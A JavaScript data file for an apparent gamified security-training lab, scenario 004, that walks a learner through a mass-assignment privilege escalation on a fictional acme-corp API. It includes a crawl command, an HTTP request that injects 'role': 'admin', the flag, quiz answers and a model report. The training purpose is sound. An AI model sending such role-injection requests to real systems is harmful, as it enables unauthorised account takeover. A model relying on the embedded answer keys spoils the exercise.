// ==========================================================
// SCENARIO 004: MASS ASSIGNMENT (HARD) - V2 DATA
// ==========================================================

window.scenario_004 = {
  metadata: {
    id: "scenario-004",
    title: "Mass Assignment Admin Privilege Escalation",
    level: "Hard",
    category: "API Security",
    company: "GitHub",
    reward: "$6,000",
    time: "3 Hours"
  },

  decisionLog: [
    {
      hypothesis: "Registration form checks block you from inserting additional database properties.",
      whyFailed: "Although client UI is locked, backend maps incoming JSON variables directly to models without filters.",
      planB: "Append privilege parameters (role, admin) directly to update payloads to test mapping bounds.",
      ignored: "Brute-forcing admin login credentials."
    }
  ],

  payloads: [
    {
      code: "{\"username\": \"hunter\", \"role\": \"admin\"}",
      explanation: "Injecting restricted database fields into JSON body schemas.",
      whyWorked: "The user database model dynamically auto-binds all request attributes withoutwhitelisting columns.",
      alternatives: ["Parameter pollution", "Nested object overriding"]
    }
  ],

  mistakes: [
    {
      mistake: "Injecting SQLi payloads into profile edits.",
      whyWrong: "Framework uses ORMs which automatically parameterize query inputs.",
      betterWay: "Inject JSON attributes to check auto-binding mapping logic."
    }
  ],

  steps: [
    {
      name: "Mission Brief",
      time: "09:00",
      workspace: "markdown",
      xpReward: 100,
      description: `
### Target: app.acme-corp.com
Examine the user settings update API. Look for Mass Assignment vulnerabilities that bind request body fields to models directly.

Click **Next Step** to scan routes.
      `,
      aiAdvisor: {
        hint: "No actions needed. Proceed to next step.",
        payloadExplanation: "No payload needed.",
        failureExplanation: "None."
      }
    },
    {
      name: "Passive Recon",
      time: "09:15",
      workspace: "recon",
      xpReward: 150,
      description: `
### Target Path Mapping
Find the active profile update path.
      `,
      terminalCommands: [
        {
          name: "katana -u https://app.acme-corp.com/ -silent | grep profile",
          correct: true,
          evidence: {
            title: "Profile update API endpoint",
            content: "PUT /api/v1/users/profile"
          },
          output: [
            { text: "[INF] Crawling site directory...", type: "info" },
            { text: "https://app.acme-corp.com/api/v1/users/profile", type: "out" },
            { text: "[INF] Katana finished. Target resolved.", type: "success" }
          ]
        }
      ],
      aiAdvisor: {
        hint: "Run the katana tool to find profile paths.",
        payloadExplanation: "Katana resolves links hidden inside JavaScript scripts.",
        failureExplanation: "Failing to crawl routes means you might miss backend APIs."
      }
    },
    {
      name: "DNS Verification",
      time: "09:40",
      workspace: "markdown",
      xpReward: 150,
      description: `
### Auditing JSON parameters
The update response contains:
\`"role": "user"\`

What happens if we inject this parameter in our request?
      `,
      choices: [
        {
          text: "A) Try bypassing CSRF protection on endpoint",
          correct: false,
          xp: -10,
          timePenalty: 5,
          outcome: "CSRF token checks are already bypassed. This is irrelevant for authorization mapping."
        },
        {
          text: "B) Inject the 'role' parameter in the update JSON request",
          correct: true,
          xp: 50,
          outcome: "Intercepting requests to inject role values."
        }
      ],
      aiAdvisor: {
        hint: "Select option B to inject role attributes.",
        payloadExplanation: "JSON parameter injection updates whitelists records.",
        failureExplanation: "CSRF bypasses do not elevate access rights."
      }
    },
    {
      name: "Burp Verification",
      time: "10:05",
      workspace: "burp",
      xpReward: 200,
      description: `
### Intercepting Request
Inject \`"role": "admin"\` parameter into JSON payload body.
      `,
      burpRequest: "PUT /api/v1/users/profile HTTP/1.1\nHost: app.acme-corp.com\nAuthorization: Bearer jwt_token\n\n{\n  \"username\": \"hunter\"\n}",
      burpResponse: "HTTP/1.1 200 OK\n\n{\n  \"username\": \"hunter\",\n  \"role\": \"user\"\n}",
      burpActions: [
        {
          name: "Inject 'role': 'admin'",
          correct: true,
          modifiedRequest: "PUT /api/v1/users/profile HTTP/1.1\nHost: app.acme-corp.com\nAuthorization: Bearer jwt_token\n\n{\n  \"username\": \"hunter\",\n  \"role\": \"admin\"\n}",
          modifiedResponse: "HTTP/1.1 200 OK\n\n{\n  \"username\": \"hunter\",\n  \"role\": \"admin\",\n  \"flag_alert\": \"FLAG{mass_assignment_privilege_escalation_ok}\"\n}",
          evidence: {
            title: "Privilege Escalation JSON",
            content: "PUT /api/v1/users/profile\nBody: {\"role\": \"admin\"}"
          }
        }
      ],
      aiAdvisor: {
        hint: "Click Inject role admin button to send the request.",
        payloadExplanation: "Inject parameters to bypass whitelists.",
        failureExplanation: "Sending unmodified payload leaves user permissions untouched."
      }
    },
    {
      name: "Exploitation & Flag",
      time: "10:30",
      workspace: "lab",
      xpReward: 300,
      instructions: "Access the updated admin panel and capture the flag.",
      targetUrl: "https://app.acme-corp.com/api/v1/users/profile",
      correctFlag: "FLAG{mass_assignment_privilege_escalation_ok}",
      aiAdvisor: {
        hint: "Flag: FLAG{mass_assignment_privilege_escalation_ok}",
        payloadExplanation: "Flag from admin panel view.",
        failureExplanation: "Flag mismatch."
      }
    },
    {
      name: "Report Writing",
      time: "11:00",
      workspace: "report",
      xpReward: 250,
      aiAdvisor: {
        hint: "Keywords: 'assignment', 'role'.",
        payloadExplanation: "Detail Mass Assignment vulnerability.",
        failureExplanation: "Details missing."
      }
    },
    {
      name: "Triage & Verdict",
      time: "5 Days Later",
      workspace: "review",
      aiAdvisor: {
        hint: "Review triage feedback.",
        payloadExplanation: "Triage logs.",
        failureExplanation: "None."
      }
    },
    {
      name: "Lessons Learned",
      time: "Post-Incident",
      workspace: "quiz",
      quizData: [
        {
          question: "What is Mass Assignment?",
          options: [
            "Binding request parameters to model objects without whitelists.",
            "Deploying multiple servers."
          ],
          answer: 0
        }
      ],
      aiAdvisor: {
        hint: "Select option A.",
        payloadExplanation: "Verify mapping logic definitions.",
        failureExplanation: "XP penalty."
      }
    }
  ],

  realReport: {
    title: "Mass Assignment vulnerability in profile update leading to privilege escalation",
    severity: "High",
    type: "PrivEsc",
    desc: "The profile update endpoint maps request JSON to user models directly. Users can inject the 'role' field to elevate privileges.",
    steps: "1. PUT /api/v1/users/profile.\n2. Add '\"role\": \"admin\"' in body.\n3. Observe role update.",
    impact: "Full admin takeover.",
    feedback: "High quality report. DTO whitelists implemented. Bounty awarded.",
    keywords: ["assignment", "role"]
  }
};
